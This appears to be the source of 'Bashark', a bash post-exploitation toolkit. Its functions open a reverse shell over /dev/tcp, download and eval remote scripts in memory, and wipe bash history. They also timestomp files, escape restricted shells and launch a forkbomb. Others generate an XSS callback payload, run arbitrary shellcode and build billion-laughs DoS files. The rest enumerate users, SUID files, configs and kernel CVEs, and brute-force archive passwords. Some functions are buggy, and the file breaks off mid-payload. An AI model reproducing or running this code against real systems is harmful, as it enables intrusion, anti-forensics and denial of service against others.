#!/bin/bash
version="1.0"

red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 3`
blue=`tput setaf 4`
magenta=`tput setaf 5`
grey=`tput setaf 8`
reset=`tput sgr0`
bold=`tput bold`
underline=`tput smul`

sun="${red}o${reset}${yellow}O${reset}"

echo '
    ____             __               __                 ___ ____ 
   / __ )____ ______/ /_  ____ ______/ /__   _   __     <  // __ \
  / __  / __ `/ ___/ __ \/ __ `/ ___/ //_/  | | / /     / // / / /
 / /_/ / /_/ (__  ) / / / /_/ / /  / ,<     | |/ /     / // /_/ / 
/_____/\__,_/____/_/ /_/\__,_/_/  /_/|_|    |___(_)   /_(_)____/  
'
echo "${red}<.>${reset} Bashark 1.0 post exploitation script"
echo "${red}<.>${reset} Created by: TheSecondSun ${sun} (thescndsun@gmail.com)"
printf "\n"
echo "[*] Type 'help' to show available commands"
printf "\n"

files_to_delete=()
dirs_to_delete=()
cleanup="on"
active_hosts=()

print_good(){
    echo "${green}[+]${reset}" $1
}
print_error(){
    echo "${red}[x]${reset}" $1
}
print_info(){
    echo "[*]" $1
}

PS1="${bold}bashark_$version${reset}$ "
export PS1

if [ "$(uname)" == "Darwin" ]; then
    platform="osx"
elif [ "$(uname)" == "Linux" ]; then 
    platform="linux"
fi  


#################COMMANDS###################    
usrs(){
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            usrs [-h]
        ${underline}DESCRIPTION:${reset} 
            Enumerate all local users and highlight currently logged-in"
    else
        current_user=`whoami`
        all_users=`cut -d: -f1 /etc/passwd`
        print_info "List of users:"
        echo "${all_users//$current_user/${green}${bold}*$current_user${reset}}"
    fi
}

getapp(){
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            getapp [-h] [FILTER]
        ${underline}OPTIONAL ARGUMENTS:${reset}
            FILTER     Show installed apps that match the filter (ex. getapp sql)
        ${underline}DESCRIPTION:${reset} 
            Enumerate all installed applications"
    else
        IFS=: read -ra dirs_in_path <<< "$PATH"
        for dir in "${dirs_in_path[@]}"; do
            for file in "$dir"/*; do
                if [ $# -eq 0 ]; then
                    [[ -x $file && -f $file ]] && print_good "${bold}${file##*/}${reset} is installed"
                else
                    filter=$1
                    if [[ $file =~ $filter ]]; then
                        [[ -x $file && -f $file ]] && print_good "${bold}${file##*/}${reset} is installed"
                    fi
                fi
            done
        done
    fi
    }

revshell(){
    arguments_errors=0
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            revshell [-h] HOST PORT
        ${underline}POSITIONAL ARGUMENTS:${reset}
            HOST     Address of the listening host
            PORT     Port to connect with
        ${underline}DESCRIPTION:${reset} 
            Send a reverse shell to remote host"
    else
        if [[ "$1" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
            host=$1
        else
            print_error "Wrong IP address format"
            ((arguments_errors++))
        fi
        if [ "$2" -eq "$2" ] 2>/dev/null; then
            port=$2
        else
            print_error "Wrong port format: integer required"
            ((arguments_errors++))
        fi
        if [ $arguments_errors = 0 ]; then
            print_good "Started reversed shell (${host}:${port})"
            revshell_cmd="bash -i >& /dev/tcp/${host}/${port} 0>&1"
            eval "$revshell_cmd"
        fi
    fi 
    
}

quit(){
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            quit [-h] [-f]
        ${underline}OPTIONAL ARGUMENTS:${reset}
            -f    Launch a forkbomb after exiting
        ${underline}DESCRIPTION:${reset} 
            Exit Bashark, clean history and execute cleanup routine"
    else
        print_info "Starting cleanup routine"
        fls=$(echo $files_to_delete | tr ":" "\n")
        drs=$(echo $dirs_to_delete | tr ":" "\n")
        print_info "Removing bash history"
        cat /dev/null > ~/.bash_history && history -c
        print_info "Started file cleanup routine"
        removed_files=0
        removed_dirs=0
        for file in ${fls[*]}; do
            rm $file
            ((removed_files++))
        done
        for dir in ${drs[*]}; do
            rmdir $dir
            ((removed_dirs++))
        done
        print_info "Removed ${bold}${removed_files}${reset} files"
        print_info "Removed ${bold}${removed_dirs}${reset} directories"
        if [[ "$@" =~ .*-f.* ]]; then
            print_info "Launched forkbomb..."
            :(){ :|:& };:
        fi 
    fi
}

timestomp(){
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            timestomp DATE FILE
        ${underline}POSITIONAL ARGUMENTS:${reset}
            DATE   Set the date to spoof (ex. 20170322)
            FILE   File to timestomp
        ${underline}DESCRIPTION:${reset} 
            Change attributes of a file (access, modify, change)."
    else
        if [ $# -eq 0 ]; then
            print_error "Specify DATE and FILE"
        elif [ $# -eq 1 ]; then
            print_error "Specify FILE"
        else
            date=$1
            file_to_modify=$2
            filename=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1)
            touch -d $date $filename
            touch -r $filename $file_to_modify
            rm $filename
            print_good "Succesfully timestomped ${file_to_modify}"
        fi
    fi
}

portscan(){
    opened_ports=0
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            portscan [-h] HOST 
        ${underline}POSITIONAL ARGUMENTS:${reset}
            HOST    Host to scan 
        ${underline}DESCRIPTION:${reset} 
            Simple portscanner that shows if most popular ports are opened"
    else
        if [[ "$1" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
            host=$1
            if [[ `ping -c 2 ${host}` =~ .*Unreachable.* ]]; then
                print_error "Host (${host}) is unreachable"
            else
                ports=(5 7 18 20 21 22 23 25 29 37 42 43 49 53 69 70 79 80 103 108 109 
                    110 115 118 119 137 139 143 150 156 161 179 190 194 197 389 396 443 444 445 
                    458 546 547 563 569 1080)
                for port in ${ports[*]}; do
                    (echo >/dev/tcp/$host/$port) &>/dev/null
                    if [ $? -eq 0 ]; then
                        print_good "$host:$port is ${green}opened${reset}"
                        ((opened_ports++))
                    fi 
                done
            fi
        if [ $opened_ports = 0 ]; then
            print_error "No ports opened"
        fi
        else
            print_error "Wrong IP address format"
        fi
    fi
}


i(){
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            i [-h] 
        ${underline}DESCRIPTION:${reset} 
            Show information about compromised host"
    else
        star="${bold}${grey}<${reset}${magenta}${bold}*${reset}${bold}${grey}>${reset}"
        root_usrs=`grep 'x:0:' /etc/passwd`

        OS=`uname -s`
        REV=`uname -r`
        MACH=`uname -m`     

        GetVersionFromFile()
        {
            VERSION=`cat $1 | tr "\n" ' ' | sed s/.*VERSION.*=\ // `
        }       

        if [ "${OS}" = "SunOS" ] ; then
            OS=Solaris
            ARCH=`uname -p` 
            OSSTR="${OS} ${REV}(${ARCH} `uname -v`)"
        elif [ "${OS}" = "AIX" ] ; then
            OSSTR="${OS} `oslevel` (`oslevel -r`)"
        elif [ "${OS}" = "Linux" ] ; then
            KERNEL=`uname -r`
            if [ -f /etc/redhat-release ] ; then
                DIST='RedHat'
                PSUEDONAME=`cat /etc/redhat-release | sed s/.*\(// | sed s/\)//`
                REV=`cat /etc/redhat-release | sed s/.*release\ // | sed s/\ .*//`
            elif [ -f /etc/SuSE-release ] ; then
                DIST=`cat /etc/SuSE-release | tr "\n" ' '| sed s/VERSION.*//`
                REV=`cat /etc/SuSE-release | tr "\n" ' ' | sed s/.*=\ //`
            elif [ -f /etc/mandrake-release ] ; then
                DIST='Mandrake'
                PSUEDONAME=`cat /etc/mandrake-release | sed s/.*\(// | sed s/\)//`
                REV=`cat /etc/mandrake-release | sed s/.*release\ // | sed s/\ .*//`
            elif [ -f /etc/debian_version ] ; then
                DIST="Debian `cat /etc/debian_version`"
                REV=""      

            fi
            if [ -f /etc/UnitedLinux-release ] ; then
                DIST="${DIST}[`cat /etc/UnitedLinux-release | tr "\n" ' ' | sed s/VERSION.*//`]"
            fi      

            OSSTR="${OS} ${DIST} ${REV}(${PSUEDONAME} ${KERNEL} ${MACH})"       

        fi      

        os=${OSSTR}

        if [[ "$root_usrs" =~ "$(whoami)" ]]; then
            is_root="(${green}Root privilleges${reset})"
        else
            is_root="(${red}No root privilleges${reset})"
        fi
        local_ip=`ip address | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
       	global_ip=`wget http://ipecho.net/plain -O - -q ; echo`
        if [ `cat /proc/sys/kernel/randomize_va_space` = "2" ]; then
            aslr="${red}Enabled${reset} (data segment randomization)"
        elif [ `cat /proc/sys/kernel/randomize_va_space` = "1" ]; then
            aslr="${yellow}Enabled${reset}"
        else
            aslr="${green}Disabled${reset}"
        fi
        if [ `cat /proc/sys/kernel/dmesg_restrict` = "1" ]; then
            dmesg_restrict="${red}Enabled${reset} (data segment randomization)"
        elif [ `cat /proc/sys/kernel/dmesg_restrict` = "0" ]; then
            dmesg_restrict="${green}Disabled${reset}"
        fi
        if [ `cat /proc/sys/kernel/perf_event_paranoid` = "-1" ]; then
            perf_paranoid="${green}Disabled${reset}"
        elif [ `cat /proc/sys/kernel/perf_event_paranoid` = "0" ]; then
            perf_paranoid="${yellow}Enabled${reset} (restricted raw tracepoint access)"
        elif [ `cat /proc/sys/kernel/perf_event_paranoid` = "1" ]; then
            perf_paranoid="${red}Enabled${reset} (restricted CPU events access)"
        elif [ `cat /proc/sys/kernel/perf_event_paranoid` = "2" ]; then
            perf_paranoid="${red}Enabled${reset} (restricted kernel profiling)"
        fi

        host="127.0.0.1"
        opened_ports=()
        ports=(5 7 18 20 21 22 23 25 29 37 42 43 49 53 69 70 79 80 103 108 109 
            110 115 118 119 137 139 143 150 156 161 179 190 194 197 389 396 443 444 445 
            458 546 547 563 569 1080 5432 4444 5555)
        for port in ${ports[*]}; do
            (echo >/dev/tcp/$host/$port) &>/dev/null
            if [ $? -eq 0 ]; then
                opened_ports+=$port,
            fi 
        done
        if [ ${#opened_ports} = 0 ]; then
            opened_ports="${red}None${reset}"
        fi
        echo "
        ${star}Username    : ${bold}$(whoami)${reset} ${is_root}
        ${star}User Groups : $(groups $(whoami))
        ${star}Hostname    : $(hostname)
        ${star}OS          : $os
        ${star}Kernel      : $(uname -r)
        ${star}Arch        : $(uname -m)
        ${star}Local IP    : ${local_ip}
        ${star}Global IP   : ${global_ip}
        ${star}RAM         : 
            $(cat /proc/meminfo |grep MemTotal)
            $(cat /proc/meminfo |grep MemFree)
            $(cat /proc/meminfo |grep SwapTotal)
        ${star}Opened Ports   : ${green}${opened_ports}${reset}
        ${star}Kernel configuration:
            * ASLR          : ${aslr}
            * DMESG_RESTRICT: ${dmesg_restrict}
            * PERF_PARANOID : ${perf_paranoid}
        ${star}Network controller:
            $(lspci|grep Network)
        ${star}Ethernet controller:
            $(lspci|grep Ethernet) 
        ${star}SATA controller:
            $(lspci|grep SATA)    
        "
    fi
}

c(){
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            c [-h] 
        ${underline}DESCRIPTION:${reset} 
            Clear screen"
    else
        clear
    fi
}

_(){
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            _ [-h] 
        ${underline}DESCRIPTION:${reset} 
            Go back to previous directory (alias of 'cd ..')"
    else
        cd ..
    fi
}

getconf(){
    not_found=0
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            getconf [-h] [-v]
        ${underline}OPTIONAL ARGUMENTS:${reset}
            -v    Show contents of config files (verbose mode)  
        ${underline}DESCRIPTION:${reset} 
            Enumerate and show configuration files"
    else
        confiles=("/etc/master.passwd" "/etc/group" "/etc/hosts" "/etc/crontab"
                "/etc/sysctl.conf" "/etc/ssh/ssh_config"
                "/etc/ssh/sshd_config" "/etc/resolv.conf" "/etc/syslog.conf" "/etc/chttp.conf" 
                "/etc/lighttpd.conf" "/etc/cups/cupsd.confcda" "/etc/inetd.conf" "/opt/lampp/etc/httpd.conf" 
                "/etc/samba/smb.conf" "/etc/openldap/ldap.conf" "/etc/ldap/ldap.conf" "/etc/exports" "/etc/auto.master" 
                "/etc/auto_master" "/etc/fstab" "/etc/cpufreq-bench.conf" "/etc/dhcpcd.conf" "/etc/dnsmasq.conf" "/etc/fuse.conf" 
                "/etc/gai.conf" "/etc/healthd.conf" "/etc/host.conf" "/etc/i3status.conf"
                "/etc/krb5.conf" "/etc/ld.so.conf" "/etc/libao.conf" "/etc/locale.conf" "/etc/logrotate.conf" 
                "/etc/ltrace.conf" "/etc/makepkg.conf" "/etc/man_db.conf" "/etc/mdadm.conf" "/etc/mke2fs.conf" 
                "/etc/mkinitcpio.conf" "/etc/modules.conf" "/etc/mpd.conf" "/etc/netconfig")

        for file in ${confiles[*]}; do
            if [ ! -f $file ]; then
                :
            else
                if [[ "$@" =~ .*-v.* ]]; then
                    print_good "Found ${magenta}${file}${reset}:"
                    cat $file
                    printf "\n"
                else
                    print_good "Found ${magenta}${file}${reset}"
                ((found++))
                fi
            fi
        done
        if  [[ $found = 0 ]]; then
            print_error "No configuration files found"
        fi
    fi    
}

cleanup(){
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            cleanup [-h] [on|off]  
        ${underline}DESCRIPTION:${reset} 
            When enabled, the cleanup routine deletes on exit every new file or folder created during Bashark session"
    else
        if [ $# -eq 0 ]; then
            if [[ $cleanup == "on" ]]; then
                print_info "Cleanup routine is ${green}${bold}ENABLED${reset}"
            else
                print_info "Cleanup routine is ${yellow}${bold}DISABLED${reset}"
            fi
        elif [ $1 == "on" ]; then
            cleanup="on"
            print_info "Cleanup routine is ${green}${bold}ENABLED${reset}"
        elif [ $1 == "off" ]; then
            cleanup="off"
            print_info "Cleanup routine is ${yellow}${bold}DISABLED${reset}"
        else
            print_error "No such option"
        fi
    fi
}

t(){
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            t [-h] [TOUCH_COMMAND_ARGUMENTS]  
        ${underline}DESCRIPTION:${reset} 
            Alias of 'touch' command that respects current cleanup routine settings"
    else
        touch $1 $2 $3 $4 $5 $6 $7 $8 $9
        if [[ "$cleanup" == "on" ]]; then
            files_to_delete+=`readlink -f $1`:
        fi
        print_info "Created ${bold}$1${reset} (${red}${bold}$(date '+%X')${reset})"
    fi
}

hosts(){
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            hosts [-h]  
        ${underline}DESCRIPTION:${reset} 
            Enumerate active hosts in background"
    else
        for ip in $(seq 1 255); do 
            ping -c 1 192.168.1.$ip>/dev/null; [ $? -eq 0 ] && printf "\n192.168.1.$ip is ${green}${bold}active${reset}\r" || : ; done &
    fi
}

isvm(){
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            isvm [-h]  
        ${underline}DESCRIPTION:${reset} 
            Check if OS is running on virtual machine"
    else
        if grep -q "^flags.*hypervisor" /proc/cpuinfo; then
            print_info "Host is running on a Virtual Machine"
        else
            print_info "Host is not a Virtual Machine"
        fi
    fi
}

fnd(){
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            fnd [-h] [-v] PATTERN
        ${underline}DESCRIPTION:${reset} 
            Search for regex occurrence in current directory"
    else
        if [[ "$@" =~ .*-v.* ]]; then
            grep -rGnw '.' -e "${@: -1}"
        else
            grep -rGlw '.' -e "${@: -1}"
        fi
    fi 
        
}

mkd(){
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            mkd [-h] [ARGUMENTS]  
        ${underline}DESCRIPTION:${reset} 
            Alias of 'mkdir' command that respects current cleanup routine settings"
    else
        mkdir $1 $2 $3 $4 $5 $6 $7 $8 $9
        if [[ "$cleanup" == "on" ]]; then
            dirs_to_delete+=`readlink -f $1`:
        fi
        print_info "Created ${bold}$1${reset} (${red}${bold}$(date '+%X')${reset})"
    fi
}

esc(){
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            esc [-h]
        ${underline}DESCRIPTION:${reset} 
            Spawn a non-restricted shell"
    else
        if hash awk 2>/dev/null; then
            awk 'BEGIN {system("/bin/sh")}'
        elif hash python 2>/dev/null; then
            python -c 'import pty; pty.spawn("/bin/sh")'
        elif hash ruby 2>/dev/null; then
            ruby -e 'exec "/bin/sh"'
        elif hash perl 2>/dev/null; then
            perl -e 'exec("sh -i");'
        else
            print_error "No interpreter found for shell escaping"
        fi
    fi
}

mex(){
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            mx [-h] FILE
        ${underline}POSITIONAL ARGUMENTS:${reset} 
            FILE    File to add permissions
        ${underline}DESCRIPTION:${reset} 
            Add executive permissions to a file"
    else
        if [ $# -eq 0 ]; then
            print_error "Specify the file"
	elif [ ! -f $1 ]; then
	    print_error "File does not exist"
        else
            chmod a=x $1
            print_good "$1 is executable"
        fi
    fi
}

lg(){
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            lg [-h] REGEX
        ${underline}POSITIONAL ARGUMENTS:${reset} 
            REGEX    Regular expression to search in listed files
        ${underline}DESCRIPTION:${reset}
            This command searches for occurrence of specified regular expression in filenames of the current directory 
            Alias of 'ls|grep -E <your_regex>'"
    else
        if [ $# -eq 0 ]; then
            print_error "Specify the regular expression"
        else
            ls|grep -E $1
        fi
    fi
}


getperm(){
    if [[ "$@" =~ .*-h.* ]]; then 
        echo "
        ${underline}USAGE:${reset}       
            getperm [-h] [-g] [-u] [-sb] [-c] [-wd] [-ed] [-wed] [-wf] [-nf] [DIRECTORY]
        ${underline}OPTIONAL ARGUMENTS:${reset}
            -g           Search for SGID (chmod 2000) 
            -u           Search for SUID (chmod 4000) 
            -sb          Search for sticky bit
            -c           Search for SGID and SUID in most common places (/bin, /sbin, /usr/bin, etc.)
            -wd          Search for world-writeable directories
            -ed          Search for world-executable directories
            -wed         Search for both executable and writeable directories
            -wf          Search for world-writeable files
            -nf          Search for no-owner files
            [DIRECTORY]  Directory to search instead of the current one
        ${underline}DESCRIPTION:${reset} 
            Search for advanced linux file permissions in the current directory. You need to specify at least
            one optional argument."
    else
        if [ $# -eq 0 ]; then
            print_error "Specify at least one option"
        else
            dir="."
            if [[ "${@: -1}" =~ .*-.* ]]; then
                :
            else
                dir="${@: -1}"
            fi
            if [[ "$@" =~ .*-g.* ]]; then
                print_good "SGID files:"
                find ${dir} -perm -g=s -type f 2>/dev/null
            fi 
            if [[ "$@" =~ .*-u.* ]]; then
                print_good "SUID files:"
                find ${dir} -perm -u=s -type f 2>/dev/null
            fi
            if [[ "$@" =~ .*-sb.* ]]; then
                print_good "Sticky bit files:"
                find ${dir} -perm -1000 -type d 2>/dev/null
            fi
            if [[ "$@" =~ .*-c.* ]]; then
                print_good "Results from common places:"
                for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done 
            fi
            if [[ "$@" =~ .*-wd.* ]]; then
                print_good "World-writeable directories:"
                find ${dir} -perm -222 -type d 2>/dev/null
            fi
            if [[ "$@" =~ .*-ed.* ]]; then
                print_good "World-executable directories:"
                find ${dir} -perm -o x -type d 2>/dev/null
            fi
            if [[ "$@" =~ .*-wed.* ]]; then
                print_good "World-executable and writeable directories:"
                find ${dir} \( -perm -o w -perm -o x \) -type d 2>/dev/null
            fi
            if [[ "$@" =~ .*-wf.* ]]; then
                print_good "World-writeable files:"
                find ${dir} -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print 
            fi
            if [[ "$@" =~ .*-nf.* ]]; then
                print_good "Files with no owner:"
                find ${dir} -xdev \( -nouser -o -nogroup \) -print
            fi
        fi
    fi
}

fileinfo(){ 
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            fileinfo [-h] FILE
        ${underline}POSITIONAL ARGUMENTS:${reset} 
            FILE    File to inspect
        ${underline}DESCRIPTION:${reset}
            Get information about specified file"
    else
        if [ $# -eq 0 ]; then
            print_error "Specify the file to inspect"
        elif [ ! -f $1 ]; then
            print_error "No such file"
        else
            if [[ -x "$1" ]]; then
                executable="${green}yes${reset}"
            else
                executable="${red}no${reset}"
            fi
            echo "
        ${green}*${reset}NAME:            $1
        ${green}*${reset}CREATION DATE:   $(stat -c %y $1| sed 's/^\([0-9\-]*\).*/\1/')
        ${green}*${reset}SIZE:            $(stat --printf="%s" $1) bytes
        ${green}*${reset}EXECUTABLE:      ${executable}
        ${green}*${reset}ENCODING:        $(file -bi $1)
        "
        fi
    fi
}

fndre(){ 
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            fndre [-h] FILE
        ${underline}POSITIONAL ARGUMENTS:${reset} 
            FILE    File to inspect
        ${underline}DESCRIPTION:${reset}
            Search for most popular regexes in a file (gmail and ip addresses, plaintext passwords, credit cards etc.)"
    else
        if [ $# -eq 0 ]; then
            print_error "Specify the file to inspect"
        elif [ ! -f $1 ]; then
            print_error "No such file"
        else
            filename=$1
            declare -A regexes
            regexes[IP_addresses]="^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$"
            regexes[MAC_addresses]="(?:[0-9a-fA-F]:?){12}"
            regexes[Gmail_addresses]="\s.*@gmail.com"
            regexes[Plaintext_passwords]="[Pp]assword\s*[:=-].*\s"
            regexes[Usernames]="[Uu]ser\s*[:=-].*\s"
            regexes[Mastercard_regex]="[51-55]\d{14}"
            regexes[Visa_regex]="4\d{15}|4\d{12}"
            regexes[Discover_regex]="6011\d{12}|65\d{14}"
            regexes[AmericanExpress_regex]="34\d{13}|37\d{13}"
            regexes[DinersClub_regex]="[300-305]/d{11}|36/d{12}|38/d{12}"
            regexes[JCB_regex]="35\d{14}|2131\d{11}|1800\d{11})"  

            for key in ${!regexes[@]}; do
                echo $regexes[$key]
                print_good "$key search results:"
                re = $regexes[$key]
                grep -oE "$re" $filename
            done
        fi
    fi
}


bruteforce(){
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            bruteforce [-h] DICTIONARY FILE
        ${underline}POSITIONAL ARGUMENTS:${reset} 
            FILE        File to bruteforce
            DICTIONARY  Dictionary to use
        ${underline}DESCRIPTION:${reset}
            Bruteforce a file with a password"
    else
        if [ $# -eq 0 ]; then
            print_error "Specify the dictionary"
        fi
        if [ $# -eq 1 ]; then
            print_error "Specify the file to bruteforce"
        elif [ ! -f $1 ]; then
            print_error "No such dictionary"
        elif [ ! -f $2 ]; then
            print_error "No such file"
        else
            dictionary=$1
            filename=$2
            cracked=0
            for word in $(cat $dictionary); do
                if [ ".zip" in $filename ]; then
                    out=$(unzip -R $word $filename)
                    if [ "inflating" in $out ]; then
                        print_good "Found password: $green$bold$word$reset"
                        (($cracked++))
                        break
                    else
                        :
                    fi
                elif [ ".rar" in $filename ]; then
                    out=$(rar x -p"$word" $filename 1>/dev/null 2>/dev/null)
                    success=`echo $?`
                    if [ "$success" = 0 ]; then
                        print_good "Found password: $green$bold$word$reset"
                        (($cracked++))
                        break
                    else
                        :
                    fi
                fi
            done
            if [ $cracked = 0 ]; then
                print_error "Password not found. Try another dictionary"
            fi
        fi
    fi

}

cve(){
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            cve [-h] 
        ${underline}DESCRIPTION:${reset}
            Search for kernel exploits"
    else
        hits=0
        declare -A exploits
        exploits=(  ["2.4.20|2.2.24|2.4.25|2.4.26|2.4.27"]="CVE-2004-0077"
                    ["2.4.29"]="CVE-2004-1235"
                    ["2.6.34|2.6.35|2.6.36"]="caps_to_root (https://github.com/SecWiki/linux-kernel-exploits/blob/master/2004/caps_to_root/15916.c)" 
                    ["2.6.5|2.6.7|2.6.8|2.6.9|2.6.10|2.6.11"]="CVE-2005-0736" 
                    ["2.6.13|2.6.14|2.6.15|2.6.16|2.6.17"]="CVE-2006-2451"
                    ["2.6.8|2.6.10|2.6.11|2.6.12|2.6.13|2.6.14|2.6.15|2.6.16"]="CVE-2006-3626"
                    ["2.6.23|2.6.24"]="CVE-2008-0600"
                    ["2.6.17|2.6.18|2.6.19|2.6.20|2.6.21|2.6.22|2.6.23|2.6.24|2.6.24.1"]="CVE-2008-0900"
                    ["2.6.11|2.6.12|2.6.13|2.6.14|2.6.15|2.6.16|2.6.17|2.6.18|2.6.19|2.6.20|2.6.21|2.6.22"]="CVE-2008-4210"
                    ["2.6.25|2.6.26|2.6.27|2.6.28|2.6.29"]="CVE-2009-1185"
                    ["2.6.25|2.6.26|2.6.27|2.6.28|2.6.29"]="CVE-2009-1337"
                    ["2.4.[4-37]|2.6.[0-30]"]="CVE-2009-2692" 
                    ["2.6.[1-19]"]="CVE-2009-2698"
                    ["2.4.[4-37]|2.6.[15-31]"]="CVE-2009-3547" )
        kernel=`uname -r`
        for exploit in "${!exploits[@]}"; do
            echo ${kernel}|grep -E ${exploit} > tmp
            check=$?
            if [ "$check" -eq 0 ]; then
                echo "${red}${bold}<.>${reset} ${exploits[$exploit]}" 
                ((hits++))
            fi
        done
        if [ $hits = 0 ]; then
            print_error "No exploits found"
        else
            echo "${magenta}(${hits} hits )${reset}"
        fi
        rm tmp
    fi
}


memexec(){ 
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            dexec [-h] HOST URL
        ${underline}POSITIONAL ARGUMENTS:${reset} 
            HOST    Remote server address 
            URL     Full path of the script on the remote server
        ${underline}DESCRIPTION:${reset}
            Download and execute a remote bash script in memory"
    else
        if [ $# -eq 0 ]; then
            print_error "Specify the server address"
        elif [ $# -eq 1 ]; then
            print_error "Specify the URL of the script"
        else
            host=$1
            script=$2
            X=`curl -fsSL "http://${host}/${script}"`
            eval "$X"
            print_good "Succesfully executed ${script} from memory"
        fi
    fi
}

jshell(){
    arguments_errors=0 
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            jshell [-h] LHOST LPORT
        ${underline}POSITIONAL ARGUMENTS:${reset} 
            LHOST    Local address to listen on (set to "-" to automatically detect the ip) 
            LPORT    Local port to listen on
        ${underline}DESCRIPTION:${reset}
            Get a Javascript shell with XSS"
    else
        if [[ "$1" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
            lhost=$1
        elif [ "$1" = "-" ]; then
            lhost=`ip address | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
        else
            print_error "Wrong IP address format"
            ((arguments_errors++))
        fi
        if [ "$2" -eq "$2" ] 2>/dev/null; then
            lport=$2
        else
            print_error "Wrong port format: integer required"
            ((arguments_errors++))
        fi
        if [ $arguments_errors = 0 ]; then
            if [ "$OSTYPE" = "darwin" ]; then
                netcat_cmd="nc -nlvk ${lport}"
            else
                netcat_cmd="nc -nlvp ${lport}"
            fi
            payload="<svg/onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//${lhost}:${lport}'},100);>"
            print_good "Generated JS payload:"
            echo ${payload}
            echo
            print_info "Waiting for the payload to be executed..."
            out=`$netcat_cmd`
        fi
    fi
}

shellcode(){
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            shellcode [-h] SHELLCODE
        ${underline}POSITIONAL ARGUMENTS:${reset} 
            SHELLCODE    Shellcode to execute in '\x' escaped form
        ${underline}DESCRIPTION:${reset}
            Execute specified shellcode"
    else
        if [ $# -eq 0 ]; then
            print_error "Specify the shellcode to run"
        else
            shellcode=$1
            cat >executor.c <<EOL
const char code[] = "${shellcode}";

int main(int argc, char **argv)
{
    int (*exeshell)();
    exeshell = (int (*)()) code;
    (int)(*exeshell)();
    return 0;
}
EOL
        gcc -fno-stack-protector -z execstack -o AAA executor.c
        ./AAA
        rm executor.c
        rm AAA
    fi
    fi
}

xml_dos(){
    if [[ "$@" =~ .*-h.* ]]; then
    echo "
        ${underline}USAGE:${reset}       
            xml_dos [-h] FORMAT
        ${underline}POSITIONAL ARGUMENTS:${reset} 
            FORMAT  Format of a DOS file [xml|yaml] 
        ${underline}DESCRIPTION:${reset} 
            Generate a 'billion laughs' DOS file"
    else
        if [ $# -eq 0 ]; then
            print_error "Specify the FORMAT"
        else
            format=$1
            if [ $format == "yaml" ]; then
                cat >dos.yml <<EOL
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
EOL
            print_good "Saved payload as ${bold}dos.yml${reset}"
            elif [ $format == "xml" ]; then
                cat >dos.xml <<EOL
<?xml version="1.0"?>
 <!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ELEMENT lolz (#PCDATA)>
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
